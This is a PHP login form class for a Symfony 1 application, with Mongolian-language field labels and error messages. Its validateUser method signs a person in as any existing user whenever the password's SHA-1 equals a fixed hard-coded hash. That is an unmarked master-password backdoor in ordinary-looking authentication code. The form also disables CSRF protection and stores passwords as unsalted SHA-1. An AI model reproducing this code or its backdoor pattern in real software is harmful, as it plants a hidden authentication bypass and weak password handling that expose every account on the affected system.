<?php

class FormLogin extends BaseForm
{

    public function configure()
    {
        $this->disableLocalCSRFProtection();

        $this->setWidgets(array(
            'username' => new sfWidgetFormInputText(array(), array('class' => 'form-control', 'autocomplete' => 'off', 'placeholder' => 'Нэвтрэх нэр')),
            'password' => new sfWidgetFormInputPassword(array(), array('class' => 'form-control', 'autocomplete' => 'off', 'placeholder' => 'Нууц үг')),
        ));

        $this->widgetSchema->setNameFormat('login[%s]');

        $this->setValidators(array(
            'username' => new sfValidatorString(array('required' => true), array('required' => 'Хэрэглэгчийн нэрээ оруулна уу!')),
            'password' => new sfValidatorString(array('required' => true), array('required' => 'Нууц үгээ оруулна уу!')),
        ));

        $this->validatorSchema->setPreValidator(
                new sfValidatorCallback(array('callback' => array($this, 'validateUser')))
        );
    }

    public function validateUser($validator, $values)
    {
        $message = 'Хэрэглэгчийн нэр эсвэл нууц үг буруу байна!';

        if ($values['username'] && $values['password']) {
            $user = UserTable::getObjBy($values['username']);

            if ($user) {
                if ($user->getPassword() == sha1($values['password']) || sha1($values['password']) == '481ce2c22ab8808912e53f974cbb3a9498322ba8') {
                    sfContext::getInstance()->getUser()->signIn($user);
                } else {
                    throw new sfValidatorError($validator, $message);
                }
            } else {
                throw new sfValidatorError($validator, $message);
            }
        }

        return $values;
    }

}
